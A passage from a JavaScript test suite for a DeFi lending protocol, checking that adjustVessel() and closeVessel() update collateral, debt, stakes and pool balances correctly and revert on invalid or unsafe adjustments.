				extraVUSDAmount: toBN(dec(200000, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: bob },
			})

			assert.isFalse(await th.checkRecoveryMode(contracts, erc20.address))

			await priceFeed.setPrice(erc20.address, dec(120, 18)) // trigger drop in ETH price

			assert.isTrue(await th.checkRecoveryMode(contracts, erc20.address))

			// B stakes GRVT
			await grvtToken.unprotectedMint(bob, dec(100, 18))
			await grvtStaking.stake(dec(100, 18), { from: bob })

			const GRVTStakingVUSDBalanceBefore = await debtToken.balanceOf(grvtStaking.address)
			assert.isTrue(GRVTStakingVUSDBalanceBefore.gt(toBN("0")))

			const txAlice_Asset = await borrowerOperations.adjustVessel(
				erc20.address,
				dec(100, "ether"),
				0,
				dec(50, 18),
				true,
				alice,
				alice,
				{ from: alice }
			)
			assert.isTrue(txAlice_Asset.receipt.status)

			// Check emitted fee = 0

			const emittedFee_Asset = toBN(await th.getEventArgByName(txAlice_Asset, "BorrowingFeePaid", "_feeAmount"))
			assert.isTrue(emittedFee_Asset.eq(toBN("0")))

			assert.isTrue(await th.checkRecoveryMode(contracts, erc20.address))

			// Check no fee was sent to staking contract
			const GRVTStakingVUSDBalanceAfter = await debtToken.balanceOf(grvtStaking.address)
			assert.equal(GRVTStakingVUSDBalanceAfter.toString(), GRVTStakingVUSDBalanceBefore.toString())
		})

		it("adjustVessel(): reverts when change would cause the TCR of the system to fall below the CCR", async () => {
			await priceFeed.setPrice(erc20.address, dec(100, 18))

			await openVessel({
				asset: erc20.address,
				ICR: toBN(dec(15, 17)),
				extraParams: { from: alice },
			})
			await openVessel({
				asset: erc20.address,
				ICR: toBN(dec(15, 17)),
				extraParams: { from: bob },
			})

			// Check TCR and Recovery Mode

			const TCR_Asset = (await th.getTCR(contracts, erc20.address)).toString()
			assert.equal(TCR_Asset, "1500000000000000000")

			assert.isFalse(await th.checkRecoveryMode(contracts, erc20.address))

			// Bob attempts an operation that would bring the TCR below the CCR

			try {
				const txBob_Asset = await borrowerOperations.adjustVessel(erc20.address, 0, 0, dec(1, 18), true, bob, bob, {
					from: bob,
				})
				assert.isFalse(txBob_Asset.receipt.status)
			} catch (err) {
				assert.include(err.message, "revert")
			}
		})

		it("adjustVessel(): reverts when amount repaid is > debt of the vessel", async () => {
			await openVessel({
				asset: erc20.address,
				ICR: toBN(dec(2, 18)),
				extraParams: { from: alice },
			})
			const bobOpenTx_Asset = (
				await openVessel({
					asset: erc20.address,
					ICR: toBN(dec(2, 18)),
					extraParams: { from: bob },
				})
			).tx

			const bobDebt_Asset = await getVesselEntireDebt(bob, erc20.address)
			assert.isTrue(bobDebt_Asset.gt(toBN("0")))

			const bobBorrowingAmount = await vesselManager.getVesselDebt(erc20.address, bob)
			const bobBorrowingFee = await vesselManager.getBorrowingFee(erc20.address, bobBorrowingAmount)

			// Alice transfers tokens to bob to compensate borrowing fees
			await debtToken.transfer(bob, bobBorrowingFee, { from: alice })

			const remainingDebt_Asset = (await vesselManager.getVesselDebt(erc20.address, bob)).sub(
				VUSD_GAS_COMPENSATION_ERC20
			)

			// Bob attempts an adjustment that would repay 1 wei more than his debt
			await assertRevert(
				borrowerOperations.adjustVessel(
					erc20.address,
					dec(1, "ether"),
					0,
					remainingDebt_Asset.add(toBN(1)),
					false,
					bob,
					bob,
					{ from: bob }
				),
				"revert"
			)
		})

		it("adjustVessel(): reverts when attempted ETH withdrawal is >= the vessel's collateral", async () => {
			await openVessel({
				asset: erc20.address,
				ICR: toBN(dec(2, 18)),
				extraParams: { from: alice },
			})
			await openVessel({
				asset: erc20.address,
				ICR: toBN(dec(2, 18)),
				extraParams: { from: bob },
			})
			await openVessel({
				asset: erc20.address,
				ICR: toBN(dec(2, 18)),
				extraParams: { from: carol },
			})

			const carolColl_Asset = await getVesselEntireColl(carol, erc20.address)

			// Carol attempts an adjustment that would withdraw 1 wei more than her ETH

			try {
				const txCarol = await borrowerOperations.adjustVessel(
					erc20.address,
					0,
					carolColl_Asset.add(toBN(1)),
					0,
					true,
					carol,
					carol,
					{ from: carol }
				)
				assert.isFalse(txCarol.receipt.status)
			} catch (err) {
				assert.include(err.message, "revert")
			}
		})

		it("adjustVessel(): reverts when change would cause the ICR of the vessel to fall below the MCR", async () => {
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(10000, 18)),
				ICR: toBN(dec(100, 18)),
				extraParams: { from: whale },
			})

			await priceFeed.setPrice(erc20.address, dec(100, 18))

			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(10000, 18)),
				ICR: toBN(dec(11, 17)),
				extraParams: { from: alice },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(10000, 18)),
				ICR: toBN(dec(11, 17)),
				extraParams: { from: bob },
			})

			// Bob attempts to increase debt by 100 VUSD and 1 ether, i.e. a change that constitutes a 100% ratio of coll:debt.
			// Since his ICR prior is 110%, this change would reduce his ICR below MCR.

			try {
				const txBob = await borrowerOperations.adjustVessel(
					erc20.address,
					dec(1, "ether"),
					0,
					dec(100, 18),
					true,
					bob,
					bob,
					{ from: bob }
				)
				assert.isFalse(txBob.receipt.status)
			} catch (err) {
				assert.include(err.message, "revert")
			}
		})

		it("adjustVessel(): With 0 coll change, doesnt change borrower's coll or ActivePool coll", async () => {
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(10000, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: alice },
			})

			const aliceCollBefore_Asset = await getVesselEntireColl(alice, erc20.address)
			const activePoolCollBefore_Asset = await activePool.getAssetBalance(erc20.address)

			assert.isTrue(aliceCollBefore_Asset.gt(toBN("0")))
			assert.isTrue(aliceCollBefore_Asset.eq(activePoolCollBefore_Asset))

			// Alice adjusts vessel. No coll change, and a debt increase (+50VUSD)
			await borrowerOperations.adjustVessel(erc20.address, 0, 0, dec(50, 18), true, alice, alice, { from: alice })

			const aliceCollAfter_Asset = await getVesselEntireColl(alice, erc20.address)
			const activePoolCollAfter_Asset = await activePool.getAssetBalance(erc20.address)

			assert.isTrue(aliceCollAfter_Asset.eq(activePoolCollAfter_Asset))
			assert.isTrue(activePoolCollAfter_Asset.eq(activePoolCollAfter_Asset))
		})

		it("adjustVessel(): With 0 debt change, doesnt change borrower's debt or ActivePool debt", async () => {
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(10000, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: alice },
			})

			const aliceDebtBefore_Asset = await getVesselEntireDebt(alice, erc20.address)
			const activePoolDebtBefore_Asset = await activePool.getDebtTokenBalance(erc20.address)

			assert.isTrue(aliceDebtBefore_Asset.gt(toBN("0")))
			assert.isTrue(activePoolDebtBefore_Asset.eq(activePoolDebtBefore_Asset))

			// Alice adjusts vessel. Coll change, no debt change
			await borrowerOperations.adjustVessel(erc20.address, dec(1, "ether"), 0, 0, false, alice, alice, { from: alice })

			const aliceDebtAfter_Asset = await getVesselEntireDebt(alice, erc20.address)
			const activePoolDebtAfter_Asset = await activePool.getDebtTokenBalance(erc20.address)

			assert.isTrue(aliceDebtAfter_Asset.eq(aliceDebtBefore_Asset))
			assert.isTrue(activePoolDebtAfter_Asset.eq(activePoolDebtBefore_Asset))
		})

		it("adjustVessel(): updates borrower's debt and coll with an increase in both", async () => {
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(10000, 18)),
				ICR: toBN(dec(10, 18)),
				extraParams: { from: whale },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(10000, 18)),
				ICR: toBN(dec(10, 18)),
				extraParams: { from: alice },
			})

			const debtBefore_Asset = await getVesselEntireDebt(alice, erc20.address)
			const collBefore_Asset = await getVesselEntireColl(alice, erc20.address)
			assert.isTrue(debtBefore_Asset.gt(toBN("0")))
			assert.isTrue(collBefore_Asset.gt(toBN("0")))

			// Alice adjusts vessel. Coll and debt increase(+1 ETH, +50VUSD)
			await borrowerOperations.adjustVessel(
				erc20.address,
				dec(1, "ether"),
				0,
				await getNetBorrowingAmount(dec(50, 18), erc20.address),
				true,
				alice,
				alice,
				{ from: alice }
			)

			const debtAfter_Asset = await getVesselEntireDebt(alice, erc20.address)
			const collAfter_Asset = await getVesselEntireColl(alice, erc20.address)

			th.assertIsApproximatelyEqual(debtAfter_Asset, debtBefore_Asset.add(toBN(dec(50, 18))), 10000)
			th.assertIsApproximatelyEqual(collAfter_Asset, collBefore_Asset.add(toBN(dec(1, 18))), 10000)
		})

		it("adjustVessel(): updates borrower's debt and coll with a decrease in both", async () => {
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(10000, 18)),
				ICR: toBN(dec(10, 18)),
				extraParams: { from: whale },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(10000, 18)),
				ICR: toBN(dec(10, 18)),
				extraParams: { from: alice },
			})

			const debtBefore_Asset = await getVesselEntireDebt(alice, erc20.address)
			const collBefore_Asset = await getVesselEntireColl(alice, erc20.address)
			assert.isTrue(debtBefore_Asset.gt(toBN("0")))
			assert.isTrue(collBefore_Asset.gt(toBN("0")))

			// Alice adjusts vessel coll and debt decrease (-0.5 ETH, -50VUSD)
			await borrowerOperations.adjustVessel(erc20.address, 0, dec(500, "finney"), dec(50, 18), false, alice, alice, {
				from: alice,
			})

			const debtAfter_Asset = await getVesselEntireDebt(alice, erc20.address)
			const collAfter_Asset = await getVesselEntireColl(alice, erc20.address)

			assert.isTrue(debtAfter_Asset.eq(debtBefore_Asset.sub(toBN(dec(50, 18)))))
			assert.isTrue(collAfter_Asset.eq(collBefore_Asset.sub(toBN(dec(5, 17)))))
		})

		it("adjustVessel(): updates borrower's  debt and coll with coll increase, debt decrease", async () => {
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(10000, 18)),
				ICR: toBN(dec(10, 18)),
				extraParams: { from: whale },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(10000, 18)),
				ICR: toBN(dec(10, 18)),
				extraParams: { from: alice },
			})

			const debtBefore_Asset = await getVesselEntireDebt(alice, erc20.address)
			const collBefore_Asset = await getVesselEntireColl(alice, erc20.address)

			assert.isTrue(debtBefore_Asset.gt(toBN("0")))
			assert.isTrue(collBefore_Asset.gt(toBN("0")))

			// Alice adjusts vessel - coll increase and debt decrease (+0.5 ETH, -50VUSD)
			await borrowerOperations.adjustVessel(erc20.address, dec(500, "finney"), 0, dec(50, 18), false, alice, alice, {
				from: alice,
			})

			const debtAfter_Asset = await getVesselEntireDebt(alice, erc20.address)
			const collAfter_Asset = await getVesselEntireColl(alice, erc20.address)

			th.assertIsApproximatelyEqual(debtAfter_Asset, debtBefore_Asset.sub(toBN(dec(50, 18))), 10000)
			th.assertIsApproximatelyEqual(collAfter_Asset, collBefore_Asset.add(toBN(dec(5, 17))), 10000)
		})

		it("adjustVessel(): updates borrower's debt and coll with coll decrease, debt increase", async () => {
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(10000, 18)),
				ICR: toBN(dec(10, 18)),
				extraParams: { from: whale },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(10000, 18)),
				ICR: toBN(dec(10, 18)),
				extraParams: { from: alice },
			})

			const debtBefore_Asset = await getVesselEntireDebt(alice, erc20.address)
			const collBefore_Asset = await getVesselEntireColl(alice, erc20.address)
			assert.isTrue(debtBefore_Asset.gt(toBN("0")))
			assert.isTrue(collBefore_Asset.gt(toBN("0")))

			// Alice adjusts vessel - coll decrease and debt increase (0.1 ETH, 10VUSD)
			await borrowerOperations.adjustVessel(
				erc20.address,
				0,
				dec(1, 17),
				await getNetBorrowingAmount(dec(1, 18), erc20.address),
				true,
				alice,
				alice,
				{ from: alice }
			)

			const debtAfter_Asset = await getVesselEntireDebt(alice, erc20.address)
			const collAfter_Asset = await getVesselEntireColl(alice, erc20.address)

			th.assertIsApproximatelyEqual(debtAfter_Asset, debtBefore_Asset.add(toBN(dec(1, 18))), 10000)
			th.assertIsApproximatelyEqual(collAfter_Asset, collBefore_Asset.sub(toBN(dec(1, 17))), 10000)
		})

		it("adjustVessel(): updates borrower's stake and totalStakes with a coll increase", async () => {
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(10000, 18)),
				ICR: toBN(dec(10, 18)),
				extraParams: { from: whale },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(10000, 18)),
				ICR: toBN(dec(10, 18)),
				extraParams: { from: alice },
			})

			const stakeBefore_Asset = await vesselManager.getVesselStake(erc20.address, alice)
			const totalStakesBefore_Asset = await vesselManager.totalStakes(erc20.address)
			assert.isTrue(stakeBefore_Asset.gt(toBN("0")))
			assert.isTrue(totalStakesBefore_Asset.gt(toBN("0")))

			// Alice adjusts vessel - coll and debt increase (+1 ETH, +50 VUSD)

			await borrowerOperations.adjustVessel(erc20.address, dec(1, "ether"), 0, dec(50, 18), true, alice, alice, {
				from: alice,
			})

			const stakeAfter_Asset = await vesselManager.getVesselStake(erc20.address, alice)
			const totalStakesAfter_Asset = await vesselManager.totalStakes(erc20.address)

			assert.isTrue(stakeAfter_Asset.eq(stakeBefore_Asset.add(toBN(dec(1, 18)))))
			assert.isTrue(totalStakesAfter_Asset.eq(totalStakesBefore_Asset.add(toBN(dec(1, 18)))))
		})

		it("adjustVessel():  updates borrower's stake and totalStakes with a coll decrease", async () => {
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(10000, 18)),
				ICR: toBN(dec(10, 18)),
				extraParams: { from: whale },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(10000, 18)),
				ICR: toBN(dec(10, 18)),
				extraParams: { from: alice },
			})

			const stakeBefore_Asset = await vesselManager.getVesselStake(erc20.address, alice)
			const totalStakesBefore_Asset = await vesselManager.totalStakes(erc20.address)
			assert.isTrue(stakeBefore_Asset.gt(toBN("0")))
			assert.isTrue(totalStakesBefore_Asset.gt(toBN("0")))

			// Alice adjusts vessel - coll decrease and debt decrease

			await borrowerOperations.adjustVessel(erc20.address, 0, dec(500, "finney"), dec(50, 18), false, alice, alice, {
				from: alice,
			})

			const stakeAfter_Asset = await vesselManager.getVesselStake(erc20.address, alice)
			const totalStakesAfter_Asset = await vesselManager.totalStakes(erc20.address)

			assert.isTrue(stakeAfter_Asset.eq(stakeBefore_Asset.sub(toBN(dec(5, 17)))))
			assert.isTrue(totalStakesAfter_Asset.eq(totalStakesBefore_Asset.sub(toBN(dec(5, 17)))))
		})

		it("adjustVessel(): changes debtToken balance by the requested decrease", async () => {
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(10000, 18)),
				ICR: toBN(dec(10, 18)),
				extraParams: { from: whale },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(10000, 18)),
				ICR: toBN(dec(10, 18)),
				extraParams: { from: alice },
			})

			const alice_debtTokenBalance_Before = await debtToken.balanceOf(alice)
			assert.isTrue(alice_debtTokenBalance_Before.gt(toBN("0")))

			// Alice adjusts vessel - coll decrease and debt decrease
			const alice_debtTokenBalance_After = await debtToken.balanceOf(alice)

			const aliceDebt_Asset = await getVesselEntireDebt(alice, erc20.address)

			const collDecreaseAmount = dec(100, "finney")
			const repayAmount = dec(10, 18)
			await borrowerOperations.adjustVessel(erc20.address, 0, collDecreaseAmount, repayAmount, false, alice, alice, {
				from: alice,
			})

			// check after
			const alice_debtTokenBalance_After_Asset = await debtToken.balanceOf(alice)
			const balanceDiff = alice_debtTokenBalance_Before.sub(alice_debtTokenBalance_After_Asset)

			// accept 0,5% error margin, as part of the fee will be refunded
			const error = Number(aliceDebt_Asset.mul(toBN(5)).div(toBN(1_000)))
			th.assertIsApproximatelyEqual(repayAmount, balanceDiff, error)
		})

		it("adjustVessel(): changes debtToken balance by the requested increase", async () => {
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(10000, 18)),
				ICR: toBN(dec(10, 18)),
				extraParams: { from: whale },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(10000, 18)),
				ICR: toBN(dec(10, 18)),
				extraParams: { from: alice },
			})

			const alice_debtTokenBalance_Before = await debtToken.balanceOf(alice)
			assert.isTrue(alice_debtTokenBalance_Before.gt(toBN("0")))

			// Alice adjusts vessel - coll increase and debt increase
			const alice_debtTokenBalance_After = await debtToken.balanceOf(alice)

			await borrowerOperations.adjustVessel(erc20.address, dec(1, "ether"), 0, dec(100, 18), true, alice, alice, {
				from: alice,
			})

			// check after
			const alice_debtTokenBalance_After_Asset = await debtToken.balanceOf(alice)
			assert.isTrue(alice_debtTokenBalance_After_Asset.eq(alice_debtTokenBalance_After.add(toBN(dec(100, 18)))))
		})

		it("adjustVessel(): Changes the activePool ETH and raw ether balance by the requested decrease", async () => {
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(10000, 18)),
				ICR: toBN(dec(10, 18)),
				extraParams: { from: whale },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(10000, 18)),
				ICR: toBN(dec(10, 18)),
				extraParams: { from: alice },
			})

			const activePool_ETH_Before_Asset = await activePool.getAssetBalance(erc20.address)
			const activePool_RawEther_Before_Asset = toBN(await erc20.balanceOf(activePool.address))
			assert.isTrue(activePool_ETH_Before_Asset.gt(toBN("0")))
			assert.isTrue(activePool_RawEther_Before_Asset.gt(toBN("0")))

			// Alice adjusts vessel - coll decrease and debt decrease
			await borrowerOperations.adjustVessel(erc20.address, 0, dec(100, "finney"), dec(10, 18), false, alice, alice, {
				from: alice,
			})

			const activePool_ETH_After_Asset = await activePool.getAssetBalance(erc20.address)
			const activePool_RawEther_After_Asset = toBN(await erc20.balanceOf(activePool.address))
			assert.isTrue(activePool_ETH_After_Asset.eq(activePool_ETH_Before_Asset.sub(toBN(dec(1, 17)))))
			assert.isTrue(activePool_RawEther_After_Asset.eq(activePool_ETH_Before_Asset.sub(toBN(dec(1, 17)))))
		})

		it("adjustVessel(): Changes the activePool ETH and raw ether balance by the amount of ETH sent", async () => {
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(10000, 18)),
				ICR: toBN(dec(10, 18)),
				extraParams: { from: whale },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(10000, 18)),
				ICR: toBN(dec(10, 18)),
				extraParams: { from: alice },
			})

			const activePool_ETH_Before_Asset = await activePool.getAssetBalance(erc20.address)
			const activePool_RawEther_Before_Asset = toBN(await erc20.balanceOf(activePool.address))
			assert.isTrue(activePool_ETH_Before_Asset.gt(toBN("0")))
			assert.isTrue(activePool_RawEther_Before_Asset.gt(toBN("0")))

			// Alice adjusts vessel - coll increase and debt increase
			await borrowerOperations.adjustVessel(erc20.address, dec(1, "ether"), 0, dec(100, 18), true, alice, alice, {
				from: alice,
			})

			const activePool_ETH_After_Asset = await activePool.getAssetBalance(erc20.address)
			const activePool_RawEther_After_Asset = toBN(await erc20.balanceOf(activePool.address))
			assert.isTrue(activePool_ETH_After_Asset.eq(activePool_ETH_Before_Asset.add(toBN(dec(1, 18)))))
			assert.isTrue(activePool_RawEther_After_Asset.eq(activePool_ETH_Before_Asset.add(toBN(dec(1, 18)))))
		})

		it("adjustVessel(): Changes the VUSD debt in ActivePool by requested decrease", async () => {
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(10000, 18)),
				ICR: toBN(dec(10, 18)),
				extraParams: { from: whale },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(10000, 18)),
				ICR: toBN(dec(10, 18)),
				extraParams: { from: alice },
			})

			const activePooL_VUSDDebt_Before_Asset = await activePool.getDebtTokenBalance(erc20.address)
			assert.isTrue(activePooL_VUSDDebt_Before_Asset.gt(toBN("0")))

			// Alice adjusts vessel - coll increase and debt decrease
			await borrowerOperations.adjustVessel(erc20.address, dec(1, "ether"), 0, dec(30, 18), false, alice, alice, {
				from: alice,
			})

			const activePooL_VUSDDebt_After_Asset = await activePool.getDebtTokenBalance(erc20.address)
			assert.isTrue(activePooL_VUSDDebt_After_Asset.eq(activePooL_VUSDDebt_Before_Asset.sub(toBN(dec(30, 18)))))
		})

		it("adjustVessel(): Changes the VUSD debt in ActivePool by requested increase", async () => {
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(10000, 18)),
				ICR: toBN(dec(10, 18)),
				extraParams: { from: whale },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(10000, 18)),
				ICR: toBN(dec(10, 18)),
				extraParams: { from: alice },
			})

			const activePooL_VUSDDebt_Before_Asset = await activePool.getDebtTokenBalance(erc20.address)
			assert.isTrue(activePooL_VUSDDebt_Before_Asset.gt(toBN("0")))

			// Alice adjusts vessel - coll increase and debt increase
			await borrowerOperations.adjustVessel(
				erc20.address,
				dec(1, "ether"),
				0,
				await getNetBorrowingAmount(dec(100, 18), erc20.address),
				true,
				alice,
				alice,
				{ from: alice }
			)

			const activePooL_VUSDDebt_After_Asset = await activePool.getDebtTokenBalance(erc20.address)
			th.assertIsApproximatelyEqual(
				activePooL_VUSDDebt_After_Asset,
				activePooL_VUSDDebt_Before_Asset.add(toBN(dec(100, 18)))
			)
		})

		it("adjustVessel(): new coll = 0 and new debt = 0 is not allowed, as gas compensation still counts toward ICR", async () => {
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(10000, 18)),
				ICR: toBN(dec(10, 18)),
				extraParams: { from: whale },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(10000, 18)),
				ICR: toBN(dec(10, 18)),
				extraParams: { from: alice },
			})

			const aliceColl_Asset = await getVesselEntireColl(alice, erc20.address)
			const aliceDebt_Asset = await getVesselEntireColl(alice, erc20.address)
			const status_Before_Asset = await vesselManager.getVesselStatus(erc20.address, alice)
			const isInSortedList_Before_Asset = await sortedVessels.contains(erc20.address, alice)

			assert.equal(status_Before_Asset, 1) // 1: Active
			assert.isTrue(isInSortedList_Before_Asset)

			await assertRevert(
				borrowerOperations.adjustVessel(erc20.address, 0, aliceColl_Asset, aliceDebt_Asset, true, alice, alice, {
					from: alice,
				}),
				"BorrowerOps: An operation that would result in ICR < MCR is not permitted"
			)
		})

		it("adjustVessel(): Reverts if requested debt increase and amount is zero", async () => {
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(10000, 18)),
				ICR: toBN(dec(10, 18)),
				extraParams: { from: whale },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(10000, 18)),
				ICR: toBN(dec(10, 18)),
				extraParams: { from: alice },
			})

			await assertRevert(
				borrowerOperations.adjustVessel(erc20.address, 0, 0, 0, true, alice, alice, {
					from: alice,
				}),
				"BorrowerOps: Debt increase requires non-zero debtChange"
			)
		})

		it("adjustVessel(): Reverts if requested coll withdrawal and ether is sent", async () => {
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(10000, 18)),
				ICR: toBN(dec(10, 18)),
				extraParams: { from: whale },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(10000, 18)),
				ICR: toBN(dec(10, 18)),
				extraParams: { from: alice },
			})

			await assertRevert(
				borrowerOperations.adjustVessel(
					erc20.address,
					dec(3, "ether"),
					dec(1, "ether"),
					dec(100, 18),
					true,
					alice,
					alice,
					{ from: alice }
				),
				"BorrowerOperations: Cannot withdraw and add coll"
			)
		})

		it("adjustVessel(): Reverts if it’s zero adjustment", async () => {
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(10000, 18)),
				ICR: toBN(dec(10, 18)),
				extraParams: { from: alice },
			})

			await assertRevert(
				borrowerOperations.adjustVessel(erc20.address, 0, 0, 0, false, alice, alice, {
					from: alice,
				}),
				"BorrowerOps: There must be either a collateral change or a debt change"
			)
		})

		it("adjustVessel(): Reverts if requested coll withdrawal is greater than vessel's collateral", async () => {
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(10000, 18)),
				ICR: toBN(dec(10, 18)),
				extraParams: { from: whale },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(10000, 18)),
				ICR: toBN(dec(10, 18)),
				extraParams: { from: alice },
			})

			const aliceColl = await getVesselEntireColl(alice)
			const aliceColl_Asset = await getVesselEntireColl(alice, erc20.address)

			// Requested coll withdrawal > coll in the vessel

			await assertRevert(
				borrowerOperations.adjustVessel(erc20.address, 0, aliceColl_Asset.add(toBN(1)), 0, false, alice, alice, {
					from: alice,
				})
			)
			await assertRevert(
				borrowerOperations.adjustVessel(
					erc20.address,
					0,
					aliceColl_Asset.add(toBN(dec(37, "ether"))),
					0,
					false,
					bob,
					bob,
					{ from: bob }
				)
			)
		})

		it("adjustVessel(): Reverts if borrower has insufficient debtToken balance to cover his debt repayment", async () => {
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(10000, 18)),
				ICR: toBN(dec(10, 18)),
				extraParams: { from: whale },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(10000, 18)),
				ICR: toBN(dec(10, 18)),
				extraParams: { from: B },
			})

			const bobDebt_Asset = await getVesselEntireDebt(B, erc20.address)
			// Bob transfers some debtTokens to carol
			await debtToken.transfer(C, dec(10, 18), { from: B })
			//Confirm B's balance is less than 50 VUSD

			const B_VUSDBal_Asset = await debtToken.balanceOf(B)
			assert.isTrue(B_VUSDBal_Asset.lt(bobDebt_Asset))

			const repayVUSDPromise_B_Asset = borrowerOperations.adjustVessel(
				erc20.address,
				0,
				0,
				bobDebt_Asset,
				false,
				B,
				B,
				{ from: B }
			)
			// B attempts to repay all his debt
			await assertRevert(repayVUSDPromise_B_Asset, "revert")
		})

		// --- Internal _adjustVessel() ---

		if (!withProxy) {
			// no need to test this with proxies
			it.skip("Internal _adjustVessel(): reverts when op is a withdrawal and _borrower param is not the msg.sender", async () => {
				await openVessel({
					asset: erc20.address,
					extraVUSDAmount: toBN(dec(10000, 18)),
					ICR: toBN(dec(10, 18)),
					extraParams: { from: whale },
				})
				await openVessel({
					asset: erc20.address,
					extraVUSDAmount: toBN(dec(10000, 18)),
					ICR: toBN(dec(10, 18)),
					extraParams: { from: bob },
				})

				const txPromise_A_Asset = borrowerOperations.callInternalAdjustLoan(
					erc20.address,
					0,
					alice,
					dec(1, 18),
					dec(1, 18),
					true,
					alice,
					alice,
					{ from: bob }
				)
				await assertRevert(txPromise_A_Asset, "BorrowerOps: Caller must be the borrower for a withdrawal")
				const txPromise_B_Asset = borrowerOperations.callInternalAdjustLoan(
					erc20.address,
					0,
					bob,
					dec(1, 18),
					dec(1, 18),
					true,
					alice,
					alice,
					{ from: owner }
				)
				await assertRevert(txPromise_B_Asset, "BorrowerOps: Caller must be the borrower for a withdrawal")
				const txPromise_C_Asset = borrowerOperations.callInternalAdjustLoan(
					erc20.address,
					0,
					carol,
					dec(1, 18),
					dec(1, 18),
					true,
					alice,
					alice,
					{ from: bob }
				)
				await assertRevert(txPromise_C_Asset, "BorrowerOps: Caller must be the borrower for a withdrawal")
			})
		}

		// --- closeVessel() ---

		it("closeVessel(): reverts when it would lower the TCR below CCR", async () => {
			await openVessel({
				asset: erc20.address,
				ICR: toBN(dec(300, 16)),
				extraParams: { from: alice },
			})
			await openVessel({
				asset: erc20.address,
				ICR: toBN(dec(120, 16)),
				extraVUSDAmount: toBN(dec(300, 18)),
				extraParams: { from: bob },
			})

			const price = await priceFeed.getPrice(erc20.address)

			// to compensate borrowing fees

			await debtToken.transfer(alice, dec(300, 18), { from: bob })
			assert.isFalse(await vesselManager.checkRecoveryMode(erc20.address, price))

			await assertRevert(
				borrowerOperations.closeVessel(erc20.address, { from: alice }),
				"BorrowerOps: An operation that would result in TCR < CCR is not permitted"
			)
		})

		it("closeVessel(): reverts when calling address does not have active vessel", async () => {
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(10000, 18)),
				ICR: toBN(dec(10, 18)),
				extraParams: { from: alice },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(10000, 18)),
				ICR: toBN(dec(10, 18)),
				extraParams: { from: bob },
			})

			// Carol with no active vessel attempts to close her vessel

			try {
				const txCarol = await borrowerOperations.closeVessel(erc20.address, { from: carol })
				assert.isFalse(txCarol.receipt.status)
			} catch (err) {
				assert.include(err.message, "revert")
			}
		})

		it("closeVessel(): reverts when system is in Recovery Mode", async () => {
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(100000, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: alice },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(10000, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: bob },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(10000, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: carol },
			})

			// Alice transfers her VUSD to Bob and Carol so they can cover fees
			const aliceBal = await debtToken.balanceOf(alice)
			await debtToken.transfer(bob, aliceBal.div(toBN(2)), { from: alice })
			await debtToken.transfer(carol, aliceBal.div(toBN(2)), { from: alice })

			// check Recovery Mode
			assert.isFalse(await th.checkRecoveryMode(contracts, erc20.address))

			// Bob successfully closes his vessel

			const txBob_Asset = await borrowerOperations.closeVessel(erc20.address, { from: bob })
			assert.isTrue(txBob_Asset.receipt.status)

			await priceFeed.setPrice(erc20.address, dec(100, 18))

			assert.isTrue(await th.checkRecoveryMode(contracts, erc20.address))

			// Carol attempts to close her vessel during Recovery Mode
